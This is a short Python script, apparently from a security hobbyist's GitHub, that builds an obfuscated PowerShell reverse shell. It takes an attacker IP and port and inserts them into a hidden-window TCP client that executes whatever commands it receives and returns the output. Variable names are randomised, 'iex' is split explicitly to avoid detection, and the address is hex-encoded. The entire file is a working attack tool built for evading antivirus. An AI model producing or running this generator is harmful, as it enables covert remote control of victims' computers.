# ACYBER SECURITY GITHUB MRmtwoj , 2024/10/24

import re
import string
import random

def get_user_input():
    """Get IP address and port from the user and validate them."""
    ip = input("Enter IP address: ")
    # Validate IP format
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        raise ValueError("Invalid IP address format.")
    port = input("Enter port: ")
    # Validate port range (1-65535)
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        raise ValueError("Port must be a number between 1 and 65535.")
    return ip, port

def obfuscate_script(script):
    """Obfuscate variable names and replace specific patterns in the script."""
    var_dict = {}
    # Replace all variables with random names, excluding $PSHOME
    pattern = re.compile(r'(?!\$PSHOME)(\$[A-Za-z0-9_]+)')
    script = pattern.sub(lambda m: var_dict.setdefault(m.group(1), f'${random_string(10)}'), script)

    # Replace iex with i''ex to avoid detection
    script = re.sub(r'iex', "i''ex", script)

    # Replace 'PS' with random UUID-like strings
    script = re.sub(r'\bPS\b', lambda m: f'<:{random_string(10)}:>', script)

    return script

def random_string(length=10):
    """Generate a random string of specified length using letters and digits."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def replace_ip_and_port(script, ip, port):
    """Replace placeholders for IP and port with the provided values."""
    script = script.replace("'*LHOST*',*LPORT*", f"'{ip}',{port}")
    return script

def ip_to_hex(ip):
    """Convert an IP address to its hexadecimal representation."""
    return '0x' + ''.join(f'{int(octet):02x}' for octet in ip.split('.'))

def convert_ips_to_hex(script):
    """Find and convert all IP addresses in the script to hexadecimal format."""
    ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
    return ip_pattern.sub(lambda m: ip_to_hex(m.group()), script)

def port_to_hex(port):
    """Convert a port number to its hexadecimal representation."""
    return hex(int(port))

def convert_ports_to_hex(script):
    """Find and convert all port numbers (excluding 65535) to hexadecimal format."""
    port_pattern = re.compile(r'\b(?!65535)([1-9]\d{0,4}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-4])\b')
    return port_pattern.sub(lambda m: port_to_hex(m.group()), script)

def main():
    # Get IP and port from user
    try:
        ip, port = get_user_input()
    except ValueError as e:
        print(f"Error: {e}")
        return

    # Original PowerShell script
    script = (
        "Start-Process $PSHOME\\powershell.exe -ArgumentList "
        "{-ep bypass -nop $client = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);"
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
        "$client.Close()} -WindowStyle Hidden"
    )

    # Obfuscate script
    script = obfuscate_script(script)

    # Replace IP and port
    script = replace_ip_and_port(script, ip, port)

    # Convert IP addresses and ports to hex
    script = convert_ips_to_hex(script)
    script = convert_ports_to_hex(script)

    # Output the modified script
    print(script)

if __name__ == "__main__":
    main()
